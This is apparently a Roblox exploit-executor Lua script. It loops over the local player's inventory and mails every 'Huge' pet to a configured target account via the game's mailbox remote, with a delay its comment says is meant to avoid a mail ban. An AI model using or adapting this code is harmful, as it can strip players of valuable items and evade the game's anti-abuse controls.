-- Файл: GlassScripts/AutoMailSend.lua
return function()
    if getgenv().MailSendLoaded then return end
    getgenv().MailSendLoaded = true

    local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
    local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
    local directory = require(game:GetService("ReplicatedStorage").Library.Directory)

    local function sendAllHuges()
        local target = getgenv().MailTargetUser
        if not target or target == "" then return end

        local success, data = pcall(function() return save.GetSaves()[game.Players.LocalPlayer] end)
        if not success or not data.Inventory or not data.Inventory.Pet then return end

        for uid, petData in pairs(data.Inventory.Pet) do
            if not getgenv().AutoSendHuges then break end

            -- Проверяем, Huge ли это
            local petInfo = directory.Get("Pet", petData.id)
            if petInfo and petInfo.name:find("Huge") then
                local args = {
                    target,
                    "GlassTheBest",
                    "Pet",
                    uid,
                    1
                }
                
                pcall(function()
                    network["Mailbox: Send"]:InvokeServer(unpack(args))
                end)
                task.wait(2) -- Задержка против бана почты
            end
        end
    end

    task.spawn(function()
        while true do
            if getgenv().AutoSendHuges == true then
                sendAllHuges()
            end
            task.wait(10)
        end
    end)
end
